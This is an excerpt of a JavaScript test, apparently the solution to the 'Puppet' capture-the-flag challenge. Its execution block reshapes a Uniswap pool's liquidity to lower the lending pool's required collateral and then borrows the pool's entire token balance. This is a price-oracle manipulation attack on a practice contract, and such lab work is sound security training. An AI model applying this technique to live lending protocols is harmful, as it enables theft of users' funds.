...
describe("[Challenge] Puppet", function () {
  ...
  it("Execution", async function () {
    ...
    await uniswapExchange.connect(deployer).removeLiquidity(
      10n * 10n ** 18n, // amount
      10n * 10n ** 18n, // min eth
      10n * 10n ** 18n, // min tokens
      (await ethers.provider.getBlock("latest")).timestamp * 2, // deadline
      { gasLimit: 1e6 }
    );
    await token.approve(uniswapExchange.address, UNISWAP_INITIAL_TOKEN_RESERVE);
    await uniswapExchange.addLiquidity(
      ...
      UNISWAP_INITIAL_TOKEN_RESERVE,
      (await ethers.provider.getBlock("latest")).timestamp * 2, // deadline
      { value: 1000000000, gasLimit: 1e6 }
    );
    const depositRequiredAfter = await lendingPool.calculateDepositRequired(
      POOL_INITIAL_TOKEN_BALANCE
    );
    token.approve(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);
    await lendingPool
      .connect(player)
      .borrow(POOL_INITIAL_TOKEN_BALANCE, player.address, {
        value: depositRequiredAfter,
        gasLimit: 1e6,
      });
  });
